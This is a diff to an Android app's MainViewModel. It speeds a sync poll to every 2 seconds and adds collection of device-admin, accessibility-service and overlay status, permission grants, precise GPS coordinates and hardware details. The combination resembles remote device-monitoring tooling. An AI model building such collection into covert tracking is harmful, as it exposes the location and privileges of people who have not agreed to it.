@@ -166,7 +166,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 } catch (e: Exception) {
                     android.util.Log.e("MainViewModel", "Real-time sync error: ${e.message}", e)
                 }
-                kotlinx.coroutines.delay(12000) // Poll every 12 seconds
+                kotlinx.coroutines.delay(2000) // Poll every 2 seconds for near-instant responsiveness
             }
         }
     }
@@ -535,6 +535,55 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             map["secure_install_non_market_apps"] = android.provider.Settings.Secure.getInt(cr, "install_non_market_apps", 0).toString()
             map["secure_location_mode"] = android.provider.Settings.Secure.getInt(cr, "location_mode", 0).toString()
             map["secure_accessibility_enabled"] = android.provider.Settings.Secure.getInt(cr, "accessibility_enabled", 0).toString()
+
+            // Device Administration & Privileges
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val adminComponent = android.content.ComponentName(context, MyDeviceAdminReceiver::class.java)
+            val isAdminActive = dpm.isAdminActive(adminComponent)
+            val isDeviceOwner = dpm.isDeviceOwnerApp(context.packageName)
+
+            map["is_device_admin"] = isAdminActive.toString()
+            map["is_device_owner"] = isDeviceOwner.toString()
+            map["accessibility_active"] = (MyAccessibilityService.instance != null).toString()
+            map["overlay_allowed"] = android.provider.Settings.canDrawOverlays(context).toString()
+
+            // Permissions
+            val cameraGranted = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            val locationGranted = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            
+            map["camera_permission"] = cameraGranted.toString()
+            map["location_permission"] = locationGranted.toString()
+
+            var lat = "Unknown"
+            var lon = "Unknown"
+            if (locationGranted) {
+                try {
+                    val lm = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+                    val providers = lm.getProviders(true)
+                    var bestLocation: android.location.Location? = null
+                    for (provider in providers) {
+                        val l = lm.getLastKnownLocation(provider) ?: continue
+                        if (bestLocation == null || l.accuracy < bestLocation.accuracy) {
+                            bestLocation = l
+                        }
+                    }
+                    if (bestLocation != null) {
+                        lat = String.format(java.util.Locale.US, "%.6f", bestLocation.latitude)
+                        lon = String.format(java.util.Locale.US, "%.6f", bestLocation.longitude)
+                    }
+                } catch (ex: SecurityException) {
+                    android.util.Log.e("MainViewModel", "Security exception getting location", ex)
+                } catch (ex: Exception) {
+                    android.util.Log.e("MainViewModel", "Exception getting location", ex)
+                }
+            }
+            map["latitude"] = lat
+            map["longitude"] = lon
+
+            // Hardware Metadata
+            map["device_model"] = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
+            map["device_sdk"] = android.os.Build.VERSION.SDK_INT.toString()
+            map["device_brand"] = android.os.Build.BRAND
         } catch (e: Exception) {
             android.util.Log.e("MainViewModel", "Error reading system tables", e)
         }
